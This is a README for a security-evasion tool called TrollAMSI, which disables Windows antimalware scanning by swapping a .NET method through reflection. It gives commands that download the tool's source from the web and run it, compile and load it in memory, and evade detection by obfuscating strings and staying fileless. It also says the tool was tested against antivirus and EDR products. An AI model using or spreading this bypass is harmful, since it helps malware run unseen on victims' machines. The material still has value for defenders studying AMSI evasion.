# TrollAMSI
This new technique is called "Reflection with method swapping". Opens doors for other techniques such as ETW and CLM possibly(?).\
Uses reflection to get a handle to the "ScanContent" method and updates it to point to a method we control.\

## Benefits
- No P/Invoke or win32 API calls used
- No amsi.dll patching
  
## Usage 

### Add-Type
```
>$code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSI/main/TrollAMSI.cs).content
>Add-Type $code
>[TrollAMSI]::troll()
```
### Compiled x64
```
>c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library /out:TrollAMSI.dll TrollAMSI.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
>[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\TrollAMSI.dll"))
>[TrollAMSI]::troll()
```

## OPSEC
- STATIC: obfuscate "AmsiUtils" and "ScanContent" maybe?
- DYNAMIC: Nothing much really. Note that Add-Type method will leave disk artifacts, whereas hosting the compiled DLL on a webserver and using Load() is completely in memory

## TESTING
- Tested on win defender, 2 AV and 1 EDR 
- Eitherway security products pay greater emphasis to amsi.dll and the relevant winapi calls for byte patching which we do not touch
  
## Wishlist
- same technique should/could be applicable to bypass
  - ETW write
  - CLM enforcement
  - maybe there's more?
  
## Disclaimer
Should only be used for educational purposes!